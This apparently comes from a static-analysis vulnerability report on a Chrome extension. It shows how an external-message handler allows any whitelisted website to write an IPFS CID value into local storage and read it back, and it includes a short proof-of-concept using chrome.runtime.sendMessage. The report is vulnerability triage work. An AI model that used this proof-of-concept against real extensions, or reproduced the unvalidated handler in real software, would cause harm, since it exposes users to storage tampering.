# CoCo Analysis: acblceepgdakhjhkmmkmafbbnhoobcef

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/acblceepgdakhjhkmmkmafbbnhoobcef/opgen_generated_files/bg.js
Line 975: chrome.storage.local.set({ cid: request.cid }, function () {

**Code:**

```javascript
// Background script - External message handler
chrome.runtime.onMessageExternal.addListener(function (
  request,  // ← attacker-controlled
  sender,
  sendResponse
) {
  console.log('request', request);
  console.log('sender', sender);

  if (request.type === 'set') {
    // Storage poisoning - attacker controls request.cid
    chrome.storage.local.set({ cid: request.cid }, function () { // ← sink
      console.log('cid is set to ' + request.cid);
    });
  } else if (request.type === 'get') {
    // Storage read and exfiltration
    chrome.storage.local.get(['cid'], function (result) {
      console.log('cid currently is ' + result.cid);
      sendResponse({ cid: result.cid }); // ← sends poisoned data back to attacker
    });
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted domain (youtube.com, facebook.com, etc.)
// Step 1: Poison storage
chrome.runtime.sendMessage(
  'acblceepgdakhjhkmmkmafbbnhoobcef', // extension ID
  { type: 'set', cid: 'malicious-ipfs-cid' },
  function(response) {
    console.log('Storage poisoned');
  }
);

// Step 2: Retrieve poisoned data
chrome.runtime.sendMessage(
  'acblceepgdakhjhkmmkmafbbnhoobcef',
  { type: 'get' },
  function(response) {
    console.log('Retrieved poisoned data:', response.cid);
    // Attacker receives: { cid: 'malicious-ipfs-cid' }
  }
);
```

**Impact:** Complete storage exploitation chain. External attacker (from any of 100+ whitelisted major websites like youtube.com, facebook.com, etc.) can poison chrome.storage.local with arbitrary IPFS CID values and retrieve the stored data. This enables persistent storage manipulation and data exfiltration. While the immediate impact is limited to IPFS CID values, the vulnerability demonstrates a complete attacker-controlled storage write-read cycle accessible from external domains.

---

## Sink 2: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/acblceepgdakhjhkmmkmafbbnhoobcef/opgen_generated_files/bg.js
Line 979: chrome.storage.local.get(['cid'], function (result) {
Line 981: sendResponse({ cid: result.cid });

**Classification:** TRUE POSITIVE (same flow as Sink 1)

**Reason:** This is the read-back portion of the complete storage exploitation chain described in Sink 1. Storage data flows back to the external attacker via sendResponse.
